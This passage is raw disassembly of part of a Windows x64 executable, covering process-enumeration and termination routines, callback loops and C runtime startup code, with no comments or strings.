   140002d62:	48 83 ef 01          	sub    $0x1,%rdi
   140002d66:	75 e8                	jne    0x140002d50
   140002d68:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140002d6d:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   140002d72:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140002d77:	48 8b ce             	mov    %rsi,%rcx
   140002d7a:	48 83 c4 20          	add    $0x20,%rsp
   140002d7e:	5e                   	pop    %rsi
   140002d7f:	e9 cc 03 00 00       	jmp    0x140003150
   140002d84:	cc                   	int3
   140002d85:	cc                   	int3
   140002d86:	cc                   	int3
   140002d87:	cc                   	int3
   140002d88:	cc                   	int3
   140002d89:	cc                   	int3
   140002d8a:	cc                   	int3
   140002d8b:	cc                   	int3
   140002d8c:	cc                   	int3
   140002d8d:	cc                   	int3
   140002d8e:	cc                   	int3
   140002d8f:	cc                   	int3
   140002d90:	40 55                	rex push %rbp
   140002d92:	41 56                	push   %r14
   140002d94:	48 83 ec 28          	sub    $0x28,%rsp
   140002d98:	8b e9                	mov    %ecx,%ebp
   140002d9a:	b9 80 3e 00 00       	mov    $0x3e80,%ecx
   140002d9f:	e8 b4 03 00 00       	call   0x140003158
   140002da4:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   140002da9:	c7 44 24 48 e8 03 00 	movl   $0x3e8,0x48(%rsp)
   140002db0:	00 
   140002db1:	48 8b c8             	mov    %rax,%rcx
   140002db4:	4c 8b f0             	mov    %rax,%r14
   140002db7:	e8 44 fc ff ff       	call   0x140002a00
   140002dbc:	85 c0                	test   %eax,%eax
   140002dbe:	74 7b                	je     0x140002e3b
   140002dc0:	8b 54 24 48          	mov    0x48(%rsp),%edx
   140002dc4:	85 d2                	test   %edx,%edx
   140002dc6:	74 73                	je     0x140002e3b
   140002dc8:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140002dcd:	49 8b de             	mov    %r14,%rbx
   140002dd0:	48 89 74 24 50       	mov    %rsi,0x50(%rsp)
   140002dd5:	8b f2                	mov    %edx,%esi
   140002dd7:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140002ddc:	41 bf 73 72 00 00    	mov    $0x7273,%r15d
   140002de2:	48 89 7c 24 58       	mov    %rdi,0x58(%rsp)
   140002de7:	66 44 39 7b 04       	cmp    %r15w,0x4(%rbx)
   140002dec:	75 2f                	jne    0x140002e1d
   140002dee:	44 8b 03             	mov    (%rbx),%r8d
   140002df1:	44 3b c5             	cmp    %ebp,%r8d
   140002df4:	74 27                	je     0x140002e1d
   140002df6:	33 d2                	xor    %edx,%edx
   140002df8:	8d 4a 01             	lea    0x1(%rdx),%ecx
   140002dfb:	ff 15 bf c2 00 00    	call   *0xc2bf(%rip)        # 0x14000f0c0
   140002e01:	48 8b f8             	mov    %rax,%rdi
   140002e04:	48 85 c0             	test   %rax,%rax
   140002e07:	74 14                	je     0x140002e1d
   140002e09:	33 d2                	xor    %edx,%edx
   140002e0b:	48 8b c8             	mov    %rax,%rcx
   140002e0e:	ff 15 ac c3 00 00    	call   *0xc3ac(%rip)        # 0x14000f1c0
   140002e14:	48 8b cf             	mov    %rdi,%rcx
   140002e17:	ff 15 fb c3 00 00    	call   *0xc3fb(%rip)        # 0x14000f218
   140002e1d:	48 83 c3 10          	add    $0x10,%rbx
   140002e21:	48 83 ee 01          	sub    $0x1,%rsi
   140002e25:	75 c0                	jne    0x140002de7
   140002e27:	4c 8b 7c 24 20       	mov    0x20(%rsp),%r15
   140002e2c:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140002e31:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140002e36:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140002e3b:	49 8b ce             	mov    %r14,%rcx
   140002e3e:	48 83 c4 28          	add    $0x28,%rsp
   140002e42:	41 5e                	pop    %r14
   140002e44:	5d                   	pop    %rbp
   140002e45:	e9 06 03 00 00       	jmp    0x140003150
   140002e4a:	cc                   	int3
   140002e4b:	cc                   	int3
   140002e4c:	cc                   	int3
   140002e4d:	cc                   	int3
   140002e4e:	cc                   	int3
   140002e4f:	cc                   	int3
   140002e50:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002e55:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140002e5a:	57                   	push   %rdi
   140002e5b:	48 83 ec 50          	sub    $0x50,%rsp
   140002e5f:	48 8b 05 9a 71 01 00 	mov    0x1719a(%rip),%rax        # 0x14001a000
   140002e66:	48 33 c4             	xor    %rsp,%rax
   140002e69:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002e6e:	48 8b f9             	mov    %rcx,%rdi
   140002e71:	48 8d 0d 90 3c 01 00 	lea    0x13c90(%rip),%rcx        # 0x140016b08
   140002e78:	e8 13 ee ff ff       	call   0x140001c90
   140002e7d:	48 8b d8             	mov    %rax,%rbx
   140002e80:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140002e84:	75 0b                	jne    0x140002e91
   140002e86:	8d 48 02             	lea    0x2(%rax),%ecx
   140002e89:	ff 15 91 c3 00 00    	call   *0xc391(%rip)        # 0x14000f220
   140002e8f:	eb e0                	jmp    0x140002e71
   140002e91:	33 f6                	xor    %esi,%esi
   140002e93:	33 d2                	xor    %edx,%edx
   140002e95:	48 8b cb             	mov    %rbx,%rcx
   140002e98:	ff 15 f2 c2 00 00    	call   *0xc2f2(%rip)        # 0x14000f190
   140002e9e:	85 c0                	test   %eax,%eax
   140002ea0:	74 56                	je     0x140002ef8
   140002ea2:	4c 8d 4c 24 38       	lea    0x38(%rsp),%r9
   140002ea7:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140002eac:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140002eb2:	48 8d 54 24 34       	lea    0x34(%rsp),%rdx
   140002eb7:	48 8b cb             	mov    %rbx,%rcx
   140002eba:	ff 15 80 c3 00 00    	call   *0xc380(%rip)        # 0x14000f240
   140002ec0:	85 c0                	test   %eax,%eax
   140002ec2:	74 3f                	je     0x140002f03
   140002ec4:	8b 4c 24 34          	mov    0x34(%rsp),%ecx
   140002ec8:	ff d7                	call   *%rdi
   140002eca:	4c 8d 4c 24 3c       	lea    0x3c(%rsp),%r9
   140002ecf:	c6 44 24 30 4d       	movb   $0x4d,0x30(%rsp)
   140002ed4:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140002eda:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140002edf:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140002ee4:	48 8b cb             	mov    %rbx,%rcx
   140002ee7:	ff 15 43 c3 00 00    	call   *0xc343(%rip)        # 0x14000f230
   140002eed:	48 8b cb             	mov    %rbx,%rcx
   140002ef0:	ff 15 c2 c1 00 00    	call   *0xc1c2(%rip)        # 0x14000f0b8
   140002ef6:	eb 9b                	jmp    0x140002e93
   140002ef8:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002efd:	ff 15 1d c3 00 00    	call   *0xc31d(%rip)        # 0x14000f220
   140002f03:	48 8b cb             	mov    %rbx,%rcx
   140002f06:	ff 15 ac c1 00 00    	call   *0xc1ac(%rip)        # 0x14000f0b8
   140002f0c:	eb 85                	jmp    0x140002e93
   140002f0e:	cc                   	int3
   140002f0f:	cc                   	int3
   140002f10:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002f15:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140002f1a:	57                   	push   %rdi
   140002f1b:	41 56                	push   %r14
   140002f1d:	41 57                	push   %r15
   140002f1f:	48 83 ec 30          	sub    $0x30,%rsp
   140002f23:	48 8b 05 d6 70 01 00 	mov    0x170d6(%rip),%rax        # 0x14001a000
   140002f2a:	48 33 c4             	xor    %rsp,%rax
   140002f2d:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140002f32:	4c 8b f9             	mov    %rcx,%r15
   140002f35:	b9 40 9c 00 00       	mov    $0x9c40,%ecx
   140002f3a:	e8 19 02 00 00       	call   0x140003158
   140002f3f:	b9 40 9c 00 00       	mov    $0x9c40,%ecx
   140002f44:	4c 8b f0             	mov    %rax,%r14
   140002f47:	e8 0c 02 00 00       	call   0x140003158
   140002f4c:	48 8b f0             	mov    %rax,%rsi
   140002f4f:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
   140002f56:	00 
   140002f57:	33 ff                	xor    %edi,%edi
   140002f59:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002f60:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   140002f65:	ba 40 9c 00 00       	mov    $0x9c40,%edx
   140002f6a:	49 8b ce             	mov    %r14,%rcx
   140002f6d:	ff 15 9d c2 00 00    	call   *0xc29d(%rip)        # 0x14000f210
   140002f73:	85 c0                	test   %eax,%eax
   140002f75:	74 5e                	je     0x140002fd5
   140002f77:	44 8b 4c 24 20       	mov    0x20(%rsp),%r9d
   140002f7c:	33 db                	xor    %ebx,%ebx
   140002f7e:	41 c1 e9 02          	shr    $0x2,%r9d
   140002f82:	44 89 4c 24 20       	mov    %r9d,0x20(%rsp)
   140002f87:	45 85 c9             	test   %r9d,%r9d
   140002f8a:	74 34                	je     0x140002fc0
   140002f8c:	0f 1f 40 00          	nopl   0x0(%rax)
   140002f90:	33 c0                	xor    %eax,%eax
   140002f92:	85 ff                	test   %edi,%edi
   140002f94:	74 16                	je     0x140002fac
   140002f96:	45 8b 04 9e          	mov    (%r14,%rbx,4),%r8d
   140002f9a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002fa0:	44 3b 04 86          	cmp    (%rsi,%rax,4),%r8d
   140002fa4:	74 13                	je     0x140002fb9
   140002fa6:	ff c0                	inc    %eax
   140002fa8:	3b c7                	cmp    %edi,%eax
   140002faa:	72 f4                	jb     0x140002fa0
   140002fac:	41 8b 0c 9e          	mov    (%r14,%rbx,4),%ecx
   140002fb0:	41 ff 57 08          	call   *0x8(%r15)
   140002fb4:	44 8b 4c 24 20       	mov    0x20(%rsp),%r9d
   140002fb9:	ff c3                	inc    %ebx
   140002fbb:	41 3b d9             	cmp    %r9d,%ebx
   140002fbe:	72 d0                	jb     0x140002f90
   140002fc0:	41 b8 40 9c 00 00    	mov    $0x9c40,%r8d
   140002fc6:	49 8b d6             	mov    %r14,%rdx
   140002fc9:	48 8b ce             	mov    %rsi,%rcx
   140002fcc:	e8 0f 20 00 00       	call   0x140004fe0
   140002fd1:	8b 7c 24 20          	mov    0x20(%rsp),%edi
   140002fd5:	41 8b 0f             	mov    (%r15),%ecx
   140002fd8:	ff 15 42 c2 00 00    	call   *0xc242(%rip)        # 0x14000f220
   140002fde:	eb 80                	jmp    0x140002f60
   140002fe0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002fe5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140002fea:	57                   	push   %rdi
   140002feb:	48 83 ec 40          	sub    $0x40,%rsp
   140002fef:	48 8b 05 0a 70 01 00 	mov    0x1700a(%rip),%rax        # 0x14001a000
   140002ff6:	48 33 c4             	xor    %rsp,%rax
   140002ff9:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140002ffe:	48 8b f9             	mov    %rcx,%rdi
   140003001:	48 8d 0d 58 39 01 00 	lea    0x13958(%rip),%rcx        # 0x140016960
   140003008:	e8 83 ec ff ff       	call   0x140001c90
   14000300d:	48 8b d8             	mov    %rax,%rbx
   140003010:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140003014:	75 0b                	jne    0x140003021
   140003016:	8d 48 02             	lea    0x2(%rax),%ecx
   140003019:	ff 15 01 c2 00 00    	call   *0xc201(%rip)        # 0x14000f220
   14000301f:	eb e0                	jmp    0x140003001
   140003021:	33 f6                	xor    %esi,%esi
   140003023:	33 d2                	xor    %edx,%edx
   140003025:	48 8b cb             	mov    %rbx,%rcx
   140003028:	ff 15 62 c1 00 00    	call   *0xc162(%rip)        # 0x14000f190
   14000302e:	85 c0                	test   %eax,%eax
   140003030:	74 3d                	je     0x14000306f
   140003032:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   140003037:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000303c:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140003042:	48 8d 54 24 34       	lea    0x34(%rsp),%rdx
   140003047:	48 8b cb             	mov    %rbx,%rcx
   14000304a:	ff 15 f0 c1 00 00    	call   *0xc1f0(%rip)        # 0x14000f240
   140003050:	85 c0                	test   %eax,%eax
   140003052:	74 26                	je     0x14000307a
   140003054:	83 7c 24 30 04       	cmpl   $0x4,0x30(%rsp)
   140003059:	75 1f                	jne    0x14000307a
   14000305b:	8b 4c 24 34          	mov    0x34(%rsp),%ecx
   14000305f:	48 8b d3             	mov    %rbx,%rdx
   140003062:	ff d7                	call   *%rdi
   140003064:	48 8b cb             	mov    %rbx,%rcx
   140003067:	ff 15 4b c0 00 00    	call   *0xc04b(%rip)        # 0x14000f0b8
   14000306d:	eb b4                	jmp    0x140003023
   14000306f:	b9 01 00 00 00       	mov    $0x1,%ecx
   140003074:	ff 15 a6 c1 00 00    	call   *0xc1a6(%rip)        # 0x14000f220
   14000307a:	48 8b cb             	mov    %rbx,%rcx
   14000307d:	ff 15 35 c0 00 00    	call   *0xc035(%rip)        # 0x14000f0b8
   140003083:	eb 9e                	jmp    0x140003023
   140003085:	cc                   	int3
   140003086:	cc                   	int3
   140003087:	cc                   	int3
   140003088:	cc                   	int3
   140003089:	cc                   	int3
   14000308a:	cc                   	int3
   14000308b:	cc                   	int3
   14000308c:	cc                   	int3
   14000308d:	cc                   	int3
   14000308e:	cc                   	int3
   14000308f:	cc                   	int3
   140003090:	40 53                	rex push %rbx
   140003092:	48 83 ec 20          	sub    $0x20,%rsp
   140003096:	48 8d 0d a3 3a 01 00 	lea    0x13aa3(%rip),%rcx        # 0x140016b40
   14000309d:	49 8b d9             	mov    %r9,%rbx
   1400030a0:	ff 15 0a c0 00 00    	call   *0xc00a(%rip)        # 0x14000f0b0
   1400030a6:	48 85 c0             	test   %rax,%rax
   1400030a9:	74 10                	je     0x1400030bb
   1400030ab:	48 8d 15 b6 3a 01 00 	lea    0x13ab6(%rip),%rdx        # 0x140016b68
   1400030b2:	48 8b c8             	mov    %rax,%rcx
   1400030b5:	ff 15 4d c0 00 00    	call   *0xc04d(%rip)        # 0x14000f108
   1400030bb:	45 33 c0             	xor    %r8d,%r8d
   1400030be:	4c 8b cb             	mov    %rbx,%r9
   1400030c1:	b2 01                	mov    $0x1,%dl
   1400030c3:	41 8d 48 14          	lea    0x14(%r8),%ecx
   1400030c7:	48 83 c4 20          	add    $0x20,%rsp
   1400030cb:	5b                   	pop    %rbx
   1400030cc:	48 ff e0             	rex.W jmp *%rax
   1400030cf:	cc                   	int3
   1400030d0:	40 53                	rex push %rbx
   1400030d2:	48 83 ec 20          	sub    $0x20,%rsp
   1400030d6:	48 8d 0d 63 3a 01 00 	lea    0x13a63(%rip),%rcx        # 0x140016b40
   1400030dd:	48 8b da             	mov    %rdx,%rbx
   1400030e0:	ff 15 ca bf 00 00    	call   *0xbfca(%rip)        # 0x14000f0b0
   1400030e6:	48 85 c0             	test   %rax,%rax
   1400030e9:	74 20                	je     0x14000310b
   1400030eb:	48 8d 15 8e 3a 01 00 	lea    0x13a8e(%rip),%rdx        # 0x140016b80
   1400030f2:	48 8b c8             	mov    %rax,%rcx
   1400030f5:	ff 15 0d c0 00 00    	call   *0xc00d(%rip)        # 0x14000f108
   1400030fb:	45 33 c0             	xor    %r8d,%r8d
   1400030fe:	48 8b d3             	mov    %rbx,%rdx
   140003101:	b1 01                	mov    $0x1,%cl
   140003103:	48 83 c4 20          	add    $0x20,%rsp
   140003107:	5b                   	pop    %rbx
   140003108:	48 ff e0             	rex.W jmp *%rax
   14000310b:	45 33 c0             	xor    %r8d,%r8d
   14000310e:	48 8b d3             	mov    %rbx,%rdx
   140003111:	b1 01                	mov    $0x1,%cl
   140003113:	48 83 c4 20          	add    $0x20,%rsp
   140003117:	5b                   	pop    %rbx
   140003118:	48 ff e0             	rex.W jmp *%rax
   14000311b:	cc                   	int3
   14000311c:	cc                   	int3
   14000311d:	cc                   	int3
   14000311e:	cc                   	int3
   14000311f:	cc                   	int3
   140003120:	cc                   	int3
   140003121:	cc                   	int3
   140003122:	cc                   	int3
   140003123:	cc                   	int3
   140003124:	cc                   	int3
   140003125:	cc                   	int3
   140003126:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000312d:	00 00 00 
   140003130:	48 3b 0d c9 6e 01 00 	cmp    0x16ec9(%rip),%rcx        # 0x14001a000
   140003137:	75 10                	jne    0x140003149
   140003139:	48 c1 c1 10          	rol    $0x10,%rcx
   14000313d:	66 f7 c1 ff ff       	test   $0xffff,%cx
   140003142:	75 01                	jne    0x140003145
   140003144:	c3                   	ret
   140003145:	48 c1 c9 10          	ror    $0x10,%rcx
   140003149:	e9 ee 02 00 00       	jmp    0x14000343c
   14000314e:	cc                   	int3
   14000314f:	cc                   	int3
   140003150:	e9 4f 05 00 00       	jmp    0x1400036a4
   140003155:	cc                   	int3
   140003156:	cc                   	int3
   140003157:	cc                   	int3
   140003158:	e9 03 00 00 00       	jmp    0x140003160
   14000315d:	cc                   	int3
   14000315e:	cc                   	int3
   14000315f:	cc                   	int3
   140003160:	40 53                	rex push %rbx
   140003162:	48 83 ec 20          	sub    $0x20,%rsp
   140003166:	48 8b d9             	mov    %rcx,%rbx
   140003169:	eb 0f                	jmp    0x14000317a
   14000316b:	48 8b cb             	mov    %rbx,%rcx
   14000316e:	e8 6d 27 00 00       	call   0x1400058e0
   140003173:	85 c0                	test   %eax,%eax
   140003175:	74 13                	je     0x14000318a
   140003177:	48 8b cb             	mov    %rbx,%rcx
   14000317a:	e8 c5 27 00 00       	call   0x140005944
   14000317f:	48 85 c0             	test   %rax,%rax
   140003182:	74 e7                	je     0x14000316b
   140003184:	48 83 c4 20          	add    $0x20,%rsp
   140003188:	5b                   	pop    %rbx
   140003189:	c3                   	ret
   14000318a:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   14000318e:	74 06                	je     0x140003196
   140003190:	e8 5b 06 00 00       	call   0x1400037f0
   140003195:	cc                   	int3
   140003196:	e8 75 06 00 00       	call   0x140003810
   14000319b:	cc                   	int3
   14000319c:	40 53                	rex push %rbx
   14000319e:	48 83 ec 20          	sub    $0x20,%rsp
   1400031a2:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400031a7:	e8 2c 29 00 00       	call   0x140005ad8
   1400031ac:	e8 9b 09 00 00       	call   0x140003b4c
   1400031b1:	8b c8                	mov    %eax,%ecx
   1400031b3:	e8 7c 33 00 00       	call   0x140006534
   1400031b8:	e8 83 09 00 00       	call   0x140003b40
   1400031bd:	8b d8                	mov    %eax,%ebx
   1400031bf:	e8 fc 34 00 00       	call   0x1400066c0
   1400031c4:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400031c9:	89 18                	mov    %ebx,(%rax)
   1400031cb:	e8 fc 06 00 00       	call   0x1400038cc
   1400031d0:	84 c0                	test   %al,%al
   1400031d2:	74 73                	je     0x140003247
   1400031d4:	e8 33 0c 00 00       	call   0x140003e0c
   1400031d9:	48 8d 0d 68 0c 00 00 	lea    0xc68(%rip),%rcx        # 0x140003e48
   1400031e0:	e8 97 08 00 00       	call   0x140003a7c
   1400031e5:	e8 5a 09 00 00       	call   0x140003b44
   1400031ea:	8b c8                	mov    %eax,%ecx
   1400031ec:	e8 8f 2b 00 00       	call   0x140005d80
   1400031f1:	85 c0                	test   %eax,%eax
   1400031f3:	75 52                	jne    0x140003247
   1400031f5:	e8 5a 09 00 00       	call   0x140003b54
   1400031fa:	e8 99 09 00 00       	call   0x140003b98
   1400031ff:	85 c0                	test   %eax,%eax
   140003201:	74 0c                	je     0x14000320f
   140003203:	48 8d 0d 36 09 00 00 	lea    0x936(%rip),%rcx        # 0x140003b40
   14000320a:	e8 29 29 00 00       	call   0x140005b38
   14000320f:	e8 54 09 00 00       	call   0x140003b68
   140003214:	e8 4f 09 00 00       	call   0x140003b68
   140003219:	e8 22 09 00 00       	call   0x140003b40
   14000321e:	8b c8                	mov    %eax,%ecx
   140003220:	e8 fb 33 00 00       	call   0x140006620
   140003225:	e8 3a 09 00 00       	call   0x140003b64
   14000322a:	84 c0                	test   %al,%al
   14000322c:	74 05                	je     0x140003233
   14000322e:	e8 fd 2e 00 00       	call   0x140006130
   140003233:	e8 08 09 00 00       	call   0x140003b40
   140003238:	e8 07 0b 00 00       	call   0x140003d44
   14000323d:	85 c0                	test   %eax,%eax
   14000323f:	75 06                	jne    0x140003247
   140003241:	48 83 c4 20          	add    $0x20,%rsp
   140003245:	5b                   	pop    %rbx
   140003246:	c3                   	ret
   140003247:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000324c:	e8 6b 09 00 00       	call   0x140003bbc
   140003251:	cc                   	int3
   140003252:	cc                   	int3
   140003253:	cc                   	int3
   140003254:	48 83 ec 28          	sub    $0x28,%rsp
   140003258:	e8 1f 09 00 00       	call   0x140003b7c
   14000325d:	33 c0                	xor    %eax,%eax
   14000325f:	48 83 c4 28          	add    $0x28,%rsp
   140003263:	c3                   	ret
   140003264:	48 83 ec 28          	sub    $0x28,%rsp
   140003268:	e8 33 0b 00 00       	call   0x140003da0
   14000326d:	e8 ce 08 00 00       	call   0x140003b40
   140003272:	8b c8                	mov    %eax,%ecx
   140003274:	48 83 c4 28          	add    $0x28,%rsp
   140003278:	e9 17 34 00 00       	jmp    0x140006694
   14000327d:	cc                   	int3
   14000327e:	cc                   	int3
   14000327f:	cc                   	int3
   140003280:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003285:	57                   	push   %rdi
   140003286:	48 83 ec 30          	sub    $0x30,%rsp
   14000328a:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000328f:	e8 ec 05 00 00       	call   0x140003880
   140003294:	84 c0                	test   %al,%al
   140003296:	0f 84 30 01 00 00    	je     0x1400033cc
   14000329c:	40 32 ff             	xor    %dil,%dil
   14000329f:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   1400032a4:	e8 9b 05 00 00       	call   0x140003844
   1400032a9:	8a d8                	mov    %al,%bl
   1400032ab:	8b 0d 4f 7d 01 00    	mov    0x17d4f(%rip),%ecx        # 0x14001b000
   1400032b1:	83 f9 01             	cmp    $0x1,%ecx
   1400032b4:	0f 84 1d 01 00 00    	je     0x1400033d7
   1400032ba:	85 c9                	test   %ecx,%ecx
   1400032bc:	75 4a                	jne    0x140003308
   1400032be:	c7 05 38 7d 01 00 01 	movl   $0x1,0x17d38(%rip)        # 0x14001b000
   1400032c5:	00 00 00 
   1400032c8:	48 8d 15 01 c2 00 00 	lea    0xc201(%rip),%rdx        # 0x14000f4d0
   1400032cf:	48 8d 0d c2 c1 00 00 	lea    0xc1c2(%rip),%rcx        # 0x14000f498
   1400032d6:	e8 31 2f 00 00       	call   0x14000620c
   1400032db:	85 c0                	test   %eax,%eax
   1400032dd:	74 0a                	je     0x1400032e9
   1400032df:	b8 ff 00 00 00       	mov    $0xff,%eax
   1400032e4:	e9 d8 00 00 00       	jmp    0x1400033c1
   1400032e9:	48 8d 15 a0 c1 00 00 	lea    0xc1a0(%rip),%rdx        # 0x14000f490
   1400032f0:	48 8d 0d 89 c1 00 00 	lea    0xc189(%rip),%rcx        # 0x14000f480
   1400032f7:	e8 ac 2e 00 00       	call   0x1400061a8
   1400032fc:	c7 05 fa 7c 01 00 02 	movl   $0x2,0x17cfa(%rip)        # 0x14001b000
   140003303:	00 00 00 
   140003306:	eb 08                	jmp    0x140003310
   140003308:	40 b7 01             	mov    $0x1,%dil
   14000330b:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   140003310:	8a cb                	mov    %bl,%cl
   140003312:	e8 d9 06 00 00       	call   0x1400039f0
   140003317:	e8 88 08 00 00       	call   0x140003ba4
   14000331c:	48 8b d8             	mov    %rax,%rbx
   14000331f:	48 83 38 00          	cmpq   $0x0,(%rax)
   140003323:	74 1e                	je     0x140003343
   140003325:	48 8b c8             	mov    %rax,%rcx
   140003328:	e8 2b 06 00 00       	call   0x140003958
   14000332d:	84 c0                	test   %al,%al
   14000332f:	74 12                	je     0x140003343
   140003331:	45 33 c0             	xor    %r8d,%r8d
   140003334:	41 8d 50 02          	lea    0x2(%r8),%edx
   140003338:	33 c9                	xor    %ecx,%ecx
   14000333a:	48 8b 03             	mov    (%rbx),%rax
   14000333d:	ff 15 15 c1 00 00    	call   *0xc115(%rip)        # 0x14000f458
   140003343:	e8 64 08 00 00       	call   0x140003bac
   140003348:	48 8b d8             	mov    %rax,%rbx
   14000334b:	48 83 38 00          	cmpq   $0x0,(%rax)
   14000334f:	74 14                	je     0x140003365
   140003351:	48 8b c8             	mov    %rax,%rcx
   140003354:	e8 ff 05 00 00       	call   0x140003958
   140003359:	84 c0                	test   %al,%al
   14000335b:	74 08                	je     0x140003365
   14000335d:	48 8b 0b             	mov    (%rbx),%rcx
   140003360:	e8 87 31 00 00       	call   0x1400064ec
   140003365:	e8 9e 09 00 00       	call   0x140003d08
   14000336a:	0f b7 d8             	movzwl %ax,%ebx
   14000336d:	e8 c6 2d 00 00       	call   0x140006138
   140003372:	44 8b cb             	mov    %ebx,%r9d
   140003375:	4c 8b c0             	mov    %rax,%r8
   140003378:	33 d2                	xor    %edx,%edx
   14000337a:	48 8d 0d 7f cc ff ff 	lea    -0x3381(%rip),%rcx        # 0x140000000
   140003381:	e8 7a dc ff ff       	call   0x140001000
   140003386:	8b d8                	mov    %eax,%ebx
   140003388:	e8 bf 09 00 00       	call   0x140003d4c
   14000338d:	84 c0                	test   %al,%al
   14000338f:	74 50                	je     0x1400033e1
   140003391:	40 84 ff             	test   %dil,%dil
   140003394:	75 05                	jne    0x14000339b
   140003396:	e8 35 31 00 00       	call   0x1400064d0
   14000339b:	33 d2                	xor    %edx,%edx
   14000339d:	b1 01                	mov    $0x1,%cl
   14000339f:	e8 70 06 00 00       	call   0x140003a14
   1400033a4:	8b c3                	mov    %ebx,%eax
   1400033a6:	eb 19                	jmp    0x1400033c1
   1400033a8:	8b d8                	mov    %eax,%ebx
   1400033aa:	e8 9d 09 00 00       	call   0x140003d4c
   1400033af:	84 c0                	test   %al,%al
   1400033b1:	74 36                	je     0x1400033e9
   1400033b3:	80 7c 24 20 00       	cmpb   $0x0,0x20(%rsp)
   1400033b8:	75 05                	jne    0x1400033bf
   1400033ba:	e8 01 31 00 00       	call   0x1400064c0
   1400033bf:	8b c3                	mov    %ebx,%eax
   1400033c1:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400033c6:	48 83 c4 30          	add    $0x30,%rsp
   1400033ca:	5f                   	pop    %rdi
   1400033cb:	c3                   	ret
   1400033cc:	b9 07 00 00 00       	mov    $0x7,%ecx
   1400033d1:	e8 e6 07 00 00       	call   0x140003bbc
   1400033d6:	90                   	nop
   1400033d7:	b9 07 00 00 00       	mov    $0x7,%ecx
   1400033dc:	e8 db 07 00 00       	call   0x140003bbc
   1400033e1:	8b cb                	mov    %ebx,%ecx
   1400033e3:	e8 40 31 00 00       	call   0x140006528
   1400033e8:	90                   	nop
   1400033e9:	8b cb                	mov    %ebx,%ecx
   1400033eb:	e8 f0 30 00 00       	call   0x1400064e0
   1400033f0:	90                   	nop
   1400033f1:	cc                   	int3
   1400033f2:	cc                   	int3
   1400033f3:	cc                   	int3
   1400033f4:	48 83 ec 28          	sub    $0x28,%rsp
   1400033f8:	e8 97 06 00 00       	call   0x140003a94
   1400033fd:	48 83 c4 28          	add    $0x28,%rsp
   140003401:	e9 7a fe ff ff       	jmp    0x140003280
   140003406:	cc                   	int3
   140003407:	cc                   	int3
   140003408:	40 53                	rex push %rbx
   14000340a:	48 83 ec 20          	sub    $0x20,%rsp
   14000340e:	48 8b d9             	mov    %rcx,%rbx
   140003411:	33 c9                	xor    %ecx,%ecx
   140003413:	ff 15 87 be 00 00    	call   *0xbe87(%rip)        # 0x14000f2a0
   140003419:	48 8b cb             	mov    %rbx,%rcx
   14000341c:	ff 15 76 be 00 00    	call   *0xbe76(%rip)        # 0x14000f298
   140003422:	ff 15 a8 bd 00 00    	call   *0xbda8(%rip)        # 0x14000f1d0
   140003428:	48 8b c8             	mov    %rax,%rcx
   14000342b:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   140003430:	48 83 c4 20          	add    $0x20,%rsp
   140003434:	5b                   	pop    %rbx
   140003435:	48 ff 25 84 bd 00 00 	rex.W jmp *0xbd84(%rip)        # 0x14000f1c0
   14000343c:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140003441:	48 83 ec 38          	sub    $0x38,%rsp
   140003445:	b9 17 00 00 00       	mov    $0x17,%ecx
   14000344a:	ff 15 58 be 00 00    	call   *0xbe58(%rip)        # 0x14000f2a8
   140003450:	85 c0                	test   %eax,%eax
   140003452:	74 07                	je     0x14000345b
   140003454:	b9 02 00 00 00       	mov    $0x2,%ecx
   140003459:	cd 29                	int    $0x29
   14000345b:	48 8d 0d ce 76 01 00 	lea    0x176ce(%rip),%rcx        # 0x14001ab30
   140003462:	e8 c9 01 00 00       	call   0x140003630
   140003467:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   14000346c:	48 89 05 b5 77 01 00 	mov    %rax,0x177b5(%rip)        # 0x14001ac28
   140003473:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140003478:	48 83 c0 08          	add    $0x8,%rax
